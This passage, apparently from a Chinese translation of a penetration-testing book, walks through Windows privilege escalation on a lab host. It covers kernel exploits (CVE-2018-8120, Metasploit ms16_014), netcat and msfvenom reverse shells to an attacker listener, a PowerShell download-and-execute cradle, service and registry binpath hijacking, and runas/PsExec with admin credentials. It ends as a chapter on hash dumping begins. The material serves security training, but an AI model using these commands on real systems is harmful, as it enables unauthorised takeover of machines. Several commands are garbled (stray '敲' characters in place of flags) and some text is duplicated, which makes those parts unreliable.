  \ =========       ======= \nSystem Idle       Process                 0        \
  \       Services        0       8               K               Unknown NT AUTHORITY\\\
  SYSTEM 67:36:31 N/A\n```\n\n要列出主机上的计划任务，你可以使用 PowerShell 命令获取结果。在以下命令中，我们使用了一个过滤器来排除与微软相关的任务，因为我们感兴趣的是自定义的计划任务：\n\
  \n```\n PS C:\\Users\\Gus> Get‐ScheduledTask | where {$_.TaskPath ‐notlike \"\\\
  Microsoft*\"} | ft TaskName,TaskPath,State\n\nTaskName                         \
  \                                TaskPath State\n--------                      \
  \                                   -------- -----\nUser_Feed_Synchronization-{39054AFF-4CE0-4A65-B33D-5F0D58A8935F}\
  \ \\ Ready\n```\n\n### 文件传输\n\n无论是 Linux 还是 Windows 操作系统，我们都需要将文件传输到目标主机，特别是当我们处理内核漏洞时。在之前的章节中，你已经看到了如何传输到\
  \ Linux 主机的基础。在本节中，我们将涵盖从源到目的成功传输文件的多数场景。\n\n### Windows 主机目标\n\n如果目标主机是 Windows，可以使用以下选项传输文件：\n\
  \n*   使用 Samba 共享驱动器并尝试从你的 Windows 受限命令提示符终端访问它：\n\n    ```\n >copy \\\\[SMB IP\
  \ Address]\\[SMB Folder Name]\\[File To Transfer]\n    ```\n\n*   使用 FTP 客户端通过命令提示符将文件下载到\
  \ Windows 主机：\n\n    ```\n >ftp open [FTP Server IP Address]\n    ```\n\n    然后，输入凭据。\n\
  \n    ```\n >ftp>binary\n >ftp>get [file name]\n    ```\n\n*   我喜欢的选项是使用 PowerShell\
  \ 下载并执行文件。为了完成此工作，你需要将漏洞托管在 Web 服务器上，然后在命令提示符中执行以下命令：\n\n    ```\n >powershell \"\
  IEX(New-Object Net.WebClient).downloadString('http://[IP Address]/[file name]')\"\
  \n    ```\n\n*   使用 PowerShell 传输文件的第二方法是在 Windows 主机上创建脚本然后执行它。要创建脚本文件，必须在命令提示符中使用以下命令：\n\
  \n    ```\n >echo $storageDir = $pwd> wget.ps1\n >echo $webclient = New-Object Net.WebClient>>\
  \ wget.ps1\n >echo $url = \"http://[IP Address]/[file name]\" >> wget.ps1\n >echo\
  \ $webclient.DownloadFile($url, $file) >> wget.ps1\n >powershell -File wget.ps1\n\
  \    ```\n\n### Linux 目标\n\n如果目标主机是 Linux 操作系统，可以使用以下方法传输文件：\n\n*   使用 `scp` 将文件拷贝到远程主机：\n\
  \n    ```\n >scp file user@IP:/remote/path\n    ```\n\n*   使用 `wget` 或 `curl` 从服务器下载文件：\n\
  \n    ```\n >wget http://IP/file -O filename\n    ```\n\n*   使用 `netcat (nc)` 通过网络接收文件：\n\
  \n    ```\n >nc -lvp port > filename\n    ```\n\n\n\n\n`权限` 或 `访问控制列表` (`ACLs`)\
  \ 是定义谁有权访问什么内容的规则。典型的 ACL 就像 Windows 操作系统上的 图 11.1 所示。![Windows 权限截图](img/c11f001.png)\n\
  \n图 11.1 Windows 权限\n\n## Windows 内核利用\n\n正如你在上一节中学到的，内核是操作系统的核心。一旦利用内核漏洞，你就拥有系统的完全所有权（无论是\
  \ Windows 还是 Linux）。为了完成任务，我们可以使用与 Linux 操作系统相同的方法：\n\n1. 获取操作系统版本。\n2. 寻找匹配的漏洞。\n\
  3. 将漏洞传输到你有写入权限的目录（你可能需要在传输之前对其进行编译）。\n4. 运行它并享受 root shell。\n\n### 获取操作系统版本\n\n\
  在此阶段，我们正通过一个一个受限的 shell 远程连接到 Windows 7 主机。接下来，运行 `systeminfo` 命令查看操作系统的详细信息：\n\n\
  ```\n C:\\Users\\Gus\\Documents>systeminfo | findstr OS\nsysteminfo | findstr OS\n\
  \nOS Name:          Microsoft Windows 7 Professional \nOS Version:       6.1.7601\
  \ Service Pack 1 Build 7601\n[…]\n```\n\n### 寻找匹配的漏洞\n\n这一步的挑战是找到正确的漏洞。为了获得准确的结果，你可以在\
  \ Kali 主机上使用名为 `wesng`（Windows Exploit Suggester）的工具来可视化任何此类操作系统的候选漏洞。你可以从 GitHub\
  \ 仓库 [github.com/bitsadmin/wesng/blob/master/wes.py](http://github.com/bitsadmin/wesng/blob/master/wes.py)\
  \ 获取 `wes.py`。首先，不带任何过滤地执行 `systeminfo` 命令。然后将输出复制到 Kali 上的文件 `sysinfo.txt`。最后，使用\
  \ `wes.py` 工具检查任何漏洞：\n\n```\n root@kali:~# python wes.py ‐ ‐ update\nroot@kali:~#\
  \ python wes.py sysinfo.txt ‐i 'Elevation of Privilege' ‐‐exploits‐only\nWindows\
  \ Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )\n[+] Parsing systeminfo\
  \ output\n[+] Operating System\n    - Name:                               Windows\
  \ 7 for x64-based Systems\n                                          Service Pack\
  \ 1 \n    - Generation:                         7\n    - Build:                \
  \              7601\n    - Version:                            None\n    - Architecture:\
  \                       x64-based\n    - Installed hotfixes (3):             KB2534111,\
  \ KB2999226, KB976902\n[+] Loading definitions\n    - Creation date of definitions:\
  \       20200902\n[+] Determining missing patches\n[+] Applying display filters\n\
  [+] Found vulnerabilities\n\nDate:                                     20161108\n\
  CVE:                                      CVE-2016-7216\nKB:                   \
  \                    KB3197867\nTitle:                                    Security\
  \ Update for Windows Kernel\nAffected product:                         Windows 7\
  \ for x64-based Systems \n                                          Service Pack\
  \ 1\nAffected component: \nSeverity:                                 Important\n\
  Impact:                                   Elevation of Privilege\nExploit:     \
  \                             https://www.exploit-db.com/exploits/40766/\n[…]\n\
  ```\n\n输出结果非常庞杂，而且尝试理解 `exploit‐db` 上的 PoC 是复杂的。最简单的方法是使用 GitHub 上的以下 PoC 仓库之一：\n\
  \n[github.com/SecWiki/windows-kernel-exploits](http://github.com/SecWiki/windows-kernel-exploits)\n\
  \n项目之一“CVE‐2018‐8120”在 GitHub 列表中，因此我们将在接下来的步骤中使用它。\n\n### 执行 Payload 并获取 Root Shell\n\
  \n你只需要从 GitHub 下载 `x64.exe` 并使用你的受限 shell 将其传输到 Windows 主机。我使用 Chromium 在 Kali 上下载了该文件，所以让我们使用\
  \ `netcat`（我已经将其传输到了 Windows 主机）来启动一个新的 root shell。\n\n首先，在 Kali 上监听端口 3333 上的入站连接：\n\
  \n```\n root@kali:~# nc ‐nlvp 3333\nlistening on [any] 3333 …\n```\n\n在 Windows\
  \ 受限 shell 中，使用你从 GitHub 下载的权限提升文件 (`x64.exe`）连接到监听端口：\n\n```\n C:\\Users\\Gus\\\
  Documents>x64.exe \"nc.exe ‐nv 172.16.0.102 3333 ‐e cmd.exe\"\nx64.exe \"nc.exe\
  \ -nv 172.16.0.102 3333 -e cmd.exe\"\nCVE-2018-8120 exploit by @unamer(https://github.com/unamer)\n\
  [+] Get manager at fffff900c0884c90,worker at fffff900c29ba3d0\n[+] Triggering vulnerability…\n\
  [+] Overwriting…fffff80002c58c68\n```\n\n当你回到 Kali 终端窗口时，你应该获得了一个 root shell：\n\n\
  ```\n root@kali:~# nc -nlvp 3333\nlistening on [any] 3333 …\nconnect to [172.16.0.102]\
  \ from (UNKNOWN) [172.16.0.101] 49219\nMicrosoft Windows [Version 6.1.7601]\nCopyright\
  \ (c) 2009 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Gus\\Documents>whoami\n\
  whoami\nnt authority\\system\n```\n\n### Metasploit 提权魔法\n\nMetasploit 拥有权限提升的功能，可以让你轻松完成任务。这听起来像是一个脚本小子的工具，但它是有效的，我个人经常使用它来寻找内核漏洞。以下是使其运行所需的所需的步骤：\n\
  \n1. 首先获取一个 Meterpreter shell。\n2. 尝试执行 `x64.exe` 来完成任务。\n\n\n\n\n```\n msf5 exploit(multi/handler)>\
  \ sessions ‐i 2\n[*] Starting interaction with 2…\n\nmeterpreter> sysinfo\nComputer\
  \          : WIN7LAB\nOS                : Windows 7 (6.1 Build 7601, Service Pack\
  \ 1).\nArchitecture      : x64\nSystem Language   : en_US\nDomain            : WORKGROUP\n\
  Logged On Users   : 1\nMeterpreter       : x64/windows\nmeterpreter>\n```\n\n注意，`x64`\
  \ `Meterpreter` 运行在 Windows `x64` 版本上。生成与目标主机架构相同的 `Meterpreter` 负载（payload）始终是一个良好的做法。接下来，运行\
  \ `getsystem` 方法：\n\n```\n meterpreter> getsystem\n[-] priv_elevate_getsystem: Operation\
  \ failed: The environment is incorrect. The following was attempted:\n[-] Named\
  \ Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n\
  [-] Token Duplication (In Memory/Admin)\n```\n\n操作失败是正常的，因为 `getsystem` 方法适用于 `x86`\
  \ 遗版 Windows 操作系统（例如 Windows 2003/XP）。接下来，使用 `exploit suggester` 模块列出候选。（。（继续之前，你必须将\
  \ `Meterpreter` 会话发送到后台。）\n\n```\n meterpreter> background\n[*] Backgrounding session\
  \ 2…\nmsf5 exploit(multi/handler)> use post/multi/recon/local_exploit_suggester\n\
  msf5 post(multi/recon/local_exploit_suggester)> set session 2\nsession => 2\nmsf5\
  \ post(multi/recon/local_exploit_suggester)> run\n\n[*] 172.16.0.101 - Collecting\
  \ local exploits for x64/windows…\n[*] 172.16.0.101 - 17 exploit checks are being\
  \ tried…\n[+] 172.16.0.101 - exploit/windows/local/bypassuac_dotnet_profiler: The\
  \ target appears to be vulnerable.\n[+] 172.16.0.101 - exploit/windows/local/bypassuac_sdclt:\
  \ The target appears to be vulnerable.\nnil versions are discouraged and will be\
  \ deprecated in Rubygems 4\n[+] 172.16.0.101 - exploit/windows/local/ms10_092_schelevator:\
  \ The target appears to be vulnerable.\n[+] 172.16.0.101 ‐ exploit/windows/local/ms16_014_wmi_recv_notif:\
  \ The target appears to be vulnerable.\n[*] Post module execution completed\nmsf5\
  \ post(multi/recon/local_exploit_suggester)>\n```\n\n查看列表中的最后一个，看起来是最新的，所以我们将在演示中使用它。（我尝试了其他的，但它们都失败了。）\n\
  \n```\n msf5 post(multi/recon/local_exploit_suggester)>use exploit/windows/local/ms16_014_wmi_recv_notif\n\
  [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5\
  \ exploit(windows/local/ms16_014_wmi_recv_notif)> set payload windows/x64/meterpreter_reverse_tcp\n\
  [-] The value specified for payload is not valid.\nmsf5 exploit(windows/local/ms16_014_wmi_recv_notif)>\
  \ set session 2\nsession => 2\nmsf5 exploit(windows/local/ms16_014_wmi_recv_notif)>\
  \ set LHOST 172.16.0.102\nLHOST => 172.16.0.102\nmsf5 exploit(windows/local/ms16_014_wmi_recv_notif)>\
  \ set LPORT 4444\nLPORT => 4444\nmsf5 exploit(windows/local/ms16_014_wmi_recv_notif)>\
  \ run\n\n[*] Started reverse TCP handler on 172.16.0.102:4444 \n[*] Launching notepad\
  \ to host the exploit…\n[+] Process 2604 launched.\n[*] Reflectively injecting the\
  \ exploit DLL into 2604…\n[*] Injecting exploit into 2604…\n[*] Exploit injected.\
  \ Injecting payload into 2604…\n[*] Payload injected. Executing exploit…\n[+] Exploit\
  \ finished, wait for (hopefully privileged) payload execution to complete.\n\n[*]\
  \ Sending stage (201283 bytes) to 172.16.0.101\n[*] Meterpreter session 3 opened\
  \ (172.16.0.102:4444 -> 172.16.0.101:49160) at 2020-09-04 13:25:03 -0400\n\nmeterpreter>\
  \ getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter>\n```\n\n我们得到了系统账户。这比管理员账户还要好！\n\
  \n### 利用 Windows 应用程序\n\n应用程序可以安装在 Windows 操作系统上并以管理员/系统权限运行。每个应用程序的利用方式不同，但目标是相同的（获取本地管理员账户）。在上一章中，你已经看到如何利用\
  \ Linux 主机上的 Docker，在本节中，我们将使用另一个自定义应用程序。要实现成功的权限提升，你需要遵循以下模式：\n\n1. 识别本地 Windows\
  \ 系统已安装的应用程序。\n2. 交叉匹配并查找互联网上是否有任何漏洞。\n3. 应用漏洞 PoC 中列出的指令。\n\n列出 Windows 上已安装应用程序的最简单方法是浏览\
  \ `Program Files` 目录并检查是否有熟悉的应用程序。我已经通过 RDP 会话使用受限用户 `gus` 连接到主机。检查 `Program Files\
  \ (x86)` 文件夹发现，名为 `Iperius Backup` 的自定义应用程序已安装在本地系统上（参见图 11.2）。\n\n![Iperius Backup\
  \ 截图](img/c11f002.png)\n\n图 11.2\n\n我的下一个挑战是确定该软件的版本。打开 `About` 标签显示版本为 `6.1`，如图\
  \ 11.3 所示。\n\n![About 截图](img/c11f003.png)\n\n图 11.3\n\n查看 `exploit-db`，我们找到了一个候选者。图\
  \ 11.4。\n\n![漏洞利用过程截图](img/c11f004.png)\n\n图 11.4\n\n遵循 `PoC`，按照以下步骤操作：\n\n1. 创建备份。\n\
  2. 设置源。\n3. 设置目标。\n4. 在 Kali 上创建一个名为 `evil.bat` 的脚本：\n\n```\n @echo off\nnc.exe\
  \ 172.16.0.102 6666\n```\n\n是时候使用 `runas` 可执行文件以另一个用户的身份运行 `netcat` 了。在这个示例中，我们首先在\
  \ Kali 上使用端口 `6666` 启动了 `netcat` 监听。接下来，使用我们的受限 shell，使用管理员凭据连接到该监听器。一旦端口运行，我们返回\
  \ Kali，获得一个新 shell：图 11.5。\n\n![evil.bat 截图](img/c11f005.png)\n\n图 11.5\n\n####\
  \ 在 Windows 中以用户身份运行\n\n如果你以低权限用户身份运行并拥有管理员凭据（用户名和密码），那么你可以使用这些凭据来提升你的权限。最实用的方法是先复制反反\
  \ shell（例如 `netcat` 或使用 `msfvenom` 生成的）。之后，使用 `runas` 可执行文件连接到 Kali 主机上的另一个监听器，以另一个用户的身份运行\
  \ `netcat`。\n\n在这个示例中，我们首先在 Kali 上使用端口 `6666` 启动了 `netcat` 监听。接下来，使用我们的受限 shell，使用管理员凭据连接到该监听器：\n\
  \n```\n C:\\Users\\Gus>C:\\Windows\\System32\\runas.exe /env /noprofile /user:admin\
  \ \"C:\\Users\\Gus\\Documents\\nc.exe 172.16.0.102 6666 -e C:\\Windows\\System32\\\
  cmd.exe\"\nEnter the password for admin:\nAttempting to start C:\\Users\\Gus\\Documents\\\
  nc.exe 172.16.0.102 6666 -e C:\\Windows\\System32\\cmd.exe as user \"WIN7LAB\\admin\"\
  \ …\n```\n\n在 Kali 上，你应该获得一个管理员 shell：\n\n```\n root@kali:~# nc ‐nlvp 6666\nlistening\
  \ on [any] 6666 …\nconnect to [172.16.0.102] from (UNKNOWN) [172.16.0.101] 49174\n\
  Microsoft Windows [Version 6.1.7601]\n(c) 2009 Microsoft Corporation. All rights\
  \ reserved.\n\nC:\\Users\\Gus>whoami\nwhoami\nwin7lab\\admin\n```\n\n#### PSExec\
  \ 工具\n\n`PSExec` 命令行工具与 `runas` 可执行文件类似。你可以在以下位置获取 `PSExec`：\n\n\n\n\n\n[docs.microsoft.com/en-us/sysinternals/downloads/psexec](http://docs.microsoft.com/en-us/sysinternals/downloads/psexec)\n\
  \n此工具与 `runas.exe` 的区别在于，使用 `PSExec` 可以拥有更多的选项和灵活性。例如，如果你已经在目标 Windows 宿主机上有一个受限的\
  \ shell。在这里，你找到了管理员账户凭据（用户名为 `admin`，密码为 `password123`）。在此阶段，你可以使用 `MSFvenom` 生成反向\
  \ shell，然后在 Kali 宿主机上启动监听器：\n\n```\n $msfvenom ‐p windows/x64/shell_reverse_tcp\
  \ LHOST=172.16.0.102 LPORT=1111 ‐f exe ‐o shell_reverse.exe\n```\n\n使用 `netcat`\
  \ 启动监听器：\n\n```\n $nc ‐nlvp 1111 \n```\n\n当我们回到受限的 Windows 命令行提示符时，必须将文件 `shell_reverse`\
  \ 传输到 Windows 宿主机。之后，我们可以使用 `PSExec` 实用执行它以获取 root shell：\n\n```\n C:\\tools> PsExec64.exe\
  \ /accepteula 敲 i ‐u admin ‐p password123 C:\\tools\\shell_reverse.exe\n```\n\n\
  在此阶段，我们应该在 Kali 监听会话中获得一个管理员 shell。\n\n### 利用 Windows 服务\n\nWindows 系统中的服务类似于 Linux\
  \ OS 中的守护进程。它们在后台运行任务，大多数情况下它们以 SYSTEM 权限执行（这为我们提供了实现系统 shell 的另一种方法）。\n\n#### 与\
  \ Windows 服务交互\n\n我们需要通过命令行与 Windows 服务交互（因为我们拥有受限的 shell）。为了完成任务，我们将遇到以下常用命令：\n\
  \n```\n #列出服务的配置\nC:\\>sc.exe [service name]\n# 修改服务的设置\nC:\\>sc.exe config [service\
  \ name] [setting]=[new value]\n# 停止服务\nC:\\>sc.exe stop [service name]\n# 启动服务\n\
  C:\\>sc.exe start [service name]\n# 获取服务的状态\nC:\\>sc.exe query [service name]\n\
  ```\n\n#### 配置错误的服务权限\n\n在这种场景下，我们正在寻找权限错误的服务。换句话说，我们想要一个我们（受限用户）有权更改其配置的服务。这里是两种允许我们覆盖服务的常用设置（从而允许我们获取远程\
  \ shell）：\n\n* `SERVICE_CHANGE_CONFIG`\n* `SERVICE_ALL_ACCESS`\n\n通常情况下，你可以使用自动化工具来寻找配置错误的服务。在本章稍后的部分，你将学习一些常用工具，但目前请重点关注其功能的原理。\n\
  \n例如，自动化工具发现了一个名为 `miss_svc` 的配置错误的服务。在你的命令行提示符中，使用 `sc.exe` 工具查询其配置：\n\n```\n C:\\\
  Users\\LowPrivUser>sc qc miss_svc\n[SC] QueryServiceConfig SUCCESS\nSERVICE_NAME:\
  \ miss_svc\n        TYPE                       : 10 WIN32_OWN_PROCESS\n        START_TYPE\
  \        : 3 DEMAND_START\n        ERROR_CONTROL : 1 NORMAL\n\n BINARY_PATH_NAME\
  \ : \"C:\\Program Files\\Services\\test_service.exe\"\n LOAD_ORDER_GROUP :\n TAG\
  \                              : 0\n DISPLAY_NAME             : Miss Service\n DEPENDENCIES\
  \ :\n SERVICE_START_NAME : LocalSystem\n```\n\n注意上述结果中的两个重要设置。第一个选项 `BINARY_PATH_NAME`\
  \ 显示服务可执行文件的路径。稍后，我们将覆盖此设置以指向我们反向 shell 的路径。第二个选项是 `SERVICE_START_NAME`，它的值揭示了该服务以系统账户运行。\n\
  \n接下来，我们将使用 `accesschk.exe` 工具检查 `LowPrivUser` 对此服务的权限：\n\n```\n C:\\Users\\LowPrivUser>accesschk.exe\
  \ /accepteula ‐uwcqv LowPrivUser miss_svc\nRW miss_svc\n        SERVICE_QUERY_STATUS\n\
  \        SERVICE_QUERY_CONFIG\n        SERVICE_CHANGE_CONFIG\n        SERVICE_INTERROGATE\n\
  \        SERVICE_ENUMERATE_DEPENDENTS\n        SERVICE_START\n        SERVICE_STOP\n\
  ```\n\n太棒了！根据之前的输出，我们有权更改服务的配置，此外，我们还可以启动和停止它。请注意，我们能够启动和停止服务至关重要，否则我们必须等待机器重启才能让更改生效并获取反向\
  \ shell（也就是说，如果服务是自动启动的；如果是手动的，我们的更改将完全不会生效）。\n\n现在是更改服务配置以指向我们的反向 shell 了：\n\n\
  ```\n C:\\Users\\LowPrivUser>sc config miss_svc binpath= \"\\\"C:\\Users\\LowPrivUser\\\
  root_shell.exe\\\"\"\n```\n\n在此阶段，我们可以在我的 Kali 宿主机上启动监听器。然后重启服务来调用我们的反向 shell（进一步在我们的\
  \ Kali 宿主机上获取系统 shell）：\n\n```\n C:\\Users\\LowPrivUser>sc stop miss_svc\nC:\\Users\\\
  LowPrivUser>sc start miss_svc\n```\n\n#### 覆盖服务可执行文件\n\n在上一个示例中，我们拥有更改服务配置的权限。假设你没有这些权限（`SERVICE_CHANGE_CONFIG`），但你有更改服务可执行文件的权限。换句话说，你对文件本身具有写入权限：\n\
  \n```\n C:\\Program Files\\Services\\test_service.exe\n```\n\n要检查文件的权限，可以使用 `accesscheck.exe`\
  \ 工具：\n\n```\n C:\\tools>accesschk.exe /accepteula 敲 quvw \" C:\\Program Files\\\
  Services\\test_service.exe\"\n```\n\n如果是这样（你有写入权限），你只需要用你的反向 shell 覆盖 `test_service.exe`（必须同名）。在复制反向\
  \ shell 可执行文件后，在 Kali 上启动监听器，最后重启服务。\n\n#### 未引号的服务路径\n\n在利用此漏洞之前，你应该了解 Windows\
  \ 系统可执行文件的一些基础。在 Windows 中，你可以通过两种方式执行 `.exe` 文件。第一种是使用可执行文件的全名，例如：\n\n```\n C:\\\
  >program.exe\n```\n\n此外，某些程序会接受额外的参数：\n\n```\n C:\\>ping.exe 10.0.0.1\n```\n\n另一种执行程序的方法是，如果程序在\
  \ Windows 的 `PATH` 变量中，去掉 `.exe` 后缀：\n\n```\n C:\\>ping 10.0.0.1\n```\n\n在这个示例场景中，我们没有更改配置的权限（与之前的情况不同）。因此，目标是引导路径指向服务执行文件以运行我们的反向\
  \ shell。假设管理员将服务存在以下路径：\n\n```\n C:\\Program Files\\Admin Services\\svc test\\service.exe\n\
  ```\n\n操作系统将由于空格字符将之前的路径视为四个不同的字符串：\n\n* `C:\\Program`\n* `Files\\Admin`\n* `Services\\\
  svc`\n* `test\\service.exe`\n\n对于此漏洞，我们将针对名为 `usvc` 的服务：\n\n```\n C:\\Users\\LowPrivUser>sc\
  \ qc usvc\n[SC] QueryServiceConfig SUCCESS\nSERVICE_NAME: usvc\n       TYPE    \
  \                           : 10 WIN32_OWN_PROCESS\n       START_TYPE          \
  \       : 3 DEMAND_START\n       ERROR_CONTROL      : 1 NORMAL\n       BINARY_PATH_NAME\
  \ : \"C:\\Program Files\\Admin Services\\svc test\\service.exe\"\n[…]\n```\n\n接下来，我们将检查低权限用户对该特定服务拥有的权限：\n\
  \n```\n C:\\Users\\LowPrivUser>accesschk.exe /accepteula 敲 uwcqv LowPrivUser usvc\n\
  RW usvc\n       SERVICE_QUERY_STATUS\n       SERVICE_QUERY_CONFIG\n       SERVICE_INTERROGATE\n\
  \       SERVICE_ENUMERATE_DEPENDENTS\n       SERVICE_START\n       SERVICE_STOP\n\
  ```\n\n如你所见，我们没有更改此服务的选项，但我们启动或停止它的选项。我们的下一个目标是找到一个可写目录来保存反向 shell。检查 `C:\\Program\
  \ Files\\Admin Services\\` 显示 `Users` 组具有读写权限：\n\n```\n C:\\tools>accesschk.exe\
  \ /accepteula 敲 uwdq \"C:\\Program Files\\Admin Services\\\"\nC:\\Program Files\\\
  Admin Services\n Medium Mandatory Level (Default) [No-Write-Up]\n RW BUILTIN\\Users\n\
  \ RW NT SERVICE\\TrustedInstaller\n RW NT AUTHORITY\\SYSTEM\n RW BUILTIN\\Administrators\n\
  ```\n\n现在阶段我们只需要执行以下步骤：\n\n\n\n\n\n# 1\n1. 将反弹 shell 复制 `C:\\Program Files\\Admin\
  \ Services\\` 文件夹并重命名为 `svc.exe`，因为我们要利用 `Services\\svc` 路径变量。\n2. 在 Kali 上启动监听器。\n\
  3. 重启服务。\n4. 获取系统 shell。\n\n### 弱散的注册表权限\n\n有时候，服务本身的安全性很高，显示你没有权限更改其配置。技巧是在 Windows\
  \ 系统的其他注册表项中查找。请注意，Windows 注册表是 Windows 系统配置的数据库（例如应用程序和服务）。在这个漏洞中，我们寻找的是服务注册表项权限的配置错误。\n\
  \n对于本示例，我们使用的自动化工具是 `WinPEAS`（你将在本章后面学习更多关于它的信息）。该工具发现以下注册表项存在漏洞：\n\n```\n HKLM\\\
  System\\CurrentControlSet\\Services\\reg_svc\n```\n\n接下来，我们将使用常用工具 `accesscheck.exe`\
  \ 检查权限：\n\n```\n C:\\tools>accesschk.exe /accepteula ‐uvwqk HKLM\\System\\CurrentControlSet\\\
  Services\\reg_svc\n[…]\n RW NT AUTHORITY\\INTERACTIVE\n                        \
  \  KEY_ALL_ACCESS\n```\n\n内置组 `NT AUTHORITY\\INTERACTIVE` 具有读写权限。此组包含了所有登录到物理主机的用户（这就是为什么\
  \ `WinPEAS` 工具检测到了缺陷）。\n\n既然权限没问题了，让我们检查该路径的注册表项：\n\n```\n C:\\tools>reg query HKLM\\\
  System\\CurrentControlSet\\Services\\reg_svc\n\n[…]\n FilePath REG_EXPAND_SZ \"\
  C:\\Program Files\\Services\\registryservice.exe\"\n DisplayName      REG_SZ Registry\
  \ Service\n ObjectName       REG_SZ LocalSystem\n```\n\n在此阶段，我们只需要用反弹 shell 覆盖注册表中的\
  \ `service.exe`：\n\n```\n C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\\
  reg_svc /v\nFilePath /t REG_EXPAND_SZ /d C:\\reverse_shell.exe /f\n```\n\n我们实际上已经准备就绪；剩下的步骤是执行操作：\n\
  \n1. 在 Kali 上启动监听器。\n2. 使用命令行重启服务。\n3. 获取系统 shell。\n\n### 利用计划任务\n\n在上一章中，你学习了如何利用\
  \ cron 任务。在 Windows 系统中，cron 被称为计划任务（Scheduled Tasks）。任务可以由用户自己（例如管理员）调度运行，且高权限用户也可以为其他用户运行任务。通常，要利用这种弱点，你需要遵循以下步骤：\n\
  \n1. 手动搜索可疑脚本（可能是一个 PowerShell 脚本）。\n2. 检查内容（注释部分的内容可能显示这是一个计划任务）。\n3. 使用 `accesscheck.exe`\
  \ 实用程序检查权限，查看是否可以覆盖它。\n4. 如果可以，则用反弹 shell 覆盖内容。\n\n### Windows 提权自动化工具\n\n针对 Windows\
  \ 目标系统有很多自动化工具。每个工具都有自己的优缺点。既然你已经理解了 Windows 权限提升是如何运作的，让我们来看看最流行的自动化工具集。\n\n####\
  \ PowerUp\n\n`PowerUp.ps1` 脚本属于 PowerSploit 工具包的实用。该 PowerShell 脚本将扫描并识别 Windows\
  \ 系统中任何缺失的配置。要下载该脚本，你可以从 GitHub 获取：\n\n[github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](http://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)\n\
  \n在运行脚本之前，你必须了解一些关于运行 PowerShell 脚本的基本信息。要执行 PowerShell 代码，你需要使用 PowerShell，对吧？如果你只有一个使用命令提示符的\
  \ shell 怎么办？在命令提示符中，你可以在执行代码前加上关键字 `powershell`。例如，如果你想在命令提示符中执行 PowerShell 脚本 `C:\\\
  tools\\test.ps1`，你需要运行以下命令：\n\n```\n C:\\>powershell C:\\tools\\test.ps1\n```\n\n\
  此外，请注意，在运行 `PowerUp` 脚本之前，你必须将 PowerShell 中的执行策略更改为 Unrestricted（无限制）。默认情况下，微软启用此功能以保护用户免受恶意\
  \ PowerShell 脚本的影响：\n\n```\n C:\\>powershell Set-ExecutionPolicy -Scope CurrentUser\
  \ -ExecutionPolicy Unrestricted -Force\n```\n\n现在我们可以开始运行 `PowerUp` 脚本了。首先，使用以下命令加载它：\n\
  \n```\n C:\\tools>powershell . .\\PowerUp.ps1\n```\n\n接下来，要执行它，加载 `Invoke‐AllChecks`\
  \ 函数：\n\n```\n C:\\tools>powershell Invoke-AllChecks\n```\n\n#### WinPEAS\n\nWindows\
  \ Privilege Escalation Awesome Scripts 是 Windows 权限提升的极佳工具。要从 GitHub 下载它，你需要访问以下位置：\n\
  \n[github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](http://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\n\
  \n注意，你已经有一个编译版本（`.exe` 文件）。要下载 64 位的 `.exe` 文件，请使用以下链接：\n\n[github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEAS/bin/x64/Release](http://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEAS/bin/x64/Release)\n\
  \n接下来，在执行 WinPEAS 工具之前，你可以使用命令行添加注册表项来为输出添加颜色：\n\n```\n C:\\>reg add HKCU\\Console\
  \ /v VirtualTerminalLevel /t REG_DWORD /d 1\n```\n\n执行完之前的注册表命令后，你必须关闭 Windows 会话并重新打开一个新的命令提示符。在此阶段，你已准备好执行它。在下一步，你将通知工具快速同时运行所有检查：\n\
  \n```\n C:\\>winpeas.exe quiet fast\n```\n\n### 总结\n\n这是一个长而复杂的章节。如果你发现很难理解，请不要放弃；不断尝试即可。学习就是反复练习基础知识。本章向你介绍了\
  \ Windows 系统权限提升中最常见的场景。然而，重要的是要理解，这种类型的漏洞（`privesc`）将随着 Windows 操作系统的演进而不断进化和变化。\n\
  \n# 第 12 章\n\n## 中枢利用与横向移动\n\n横向移动中的常见做法是在建立对受主机的远程访问后，寻找存储的密码和哈希值。远程访问可以是受限的 shell、远程桌面会话，甚至是更好的\
  \ root/管理员 shell。尽管如此，如果你以低权限用户身份连接，那么你的成功概率将非常低。为什么呢？显而易见，拥有 root 账户，你可以读取系统上的任何文件来揭示你要找的内容（例如显示\
  \ Linux 系统上 `/etc/shadow` 文件的内容）。该领域的专业人士交叉使用 *pivoting*（中枢利用）和 *lateral movement*（横向移动）这两个词。在本章中，我们将使用这两个词来讨论同一个原理。此外，这项被认为是渗透测试中的后渗透阶段，因为它发生在利用目标主机之后。\n\
  \n在本章中，你将学习以下主题，以便轻松地从一个主机跳转到另一个主机：\n\n*   理解 Windows 密码哈希\n*   导出 Windows 密码哈希\n\
  *   学习哈希传递攻击 (pass the hash)\n*   端口转发概念\n    *   本地端口转发\n    *   远程端口转发\n    *\
  \   动态端口转发\n\n## 导出 Windows 哈希\n\n\n\n\n\n在本节中，你将学习如何从 Windows 宿主机提取哈希后的密码。密码有两种形式：明文或哈希值。在\
  \ Windows 中，密码是以后 NTLM 哈希格式存储的（你将在下一节中学习更多关于这种类型哈希的知识）。最佳选择是找到一个域管理员账户，以便在网络中进行横向移动。在由域控制的网络环境中，管理员使用他们的凭据来帮助员工解决任何技术问题（因此他们会在想要运行工作的主机上使用这些凭据）。此外，请注意人们倾向于对不同类型的账户重复使用相同的密码。如果公司实施了单点登录（SSO），你就可以使用这些凭据登录其他系统（例如：CRM、网页邮箱、SharePoint\
  \ 等）。\n\n## Windows NTLM 哈希\n\n旧版本的 Windows 操作系统曾使用 LAN Manager (LM) 哈希格式存储密码。由于以下主要标准，LM\
  \ 哈希很容易被破解：\n\n*   密码长度限制为最长 14 个字符。\n*   密码不区分大小写。\n*   如果密码为 14 个字符，它会被分成两个 7\
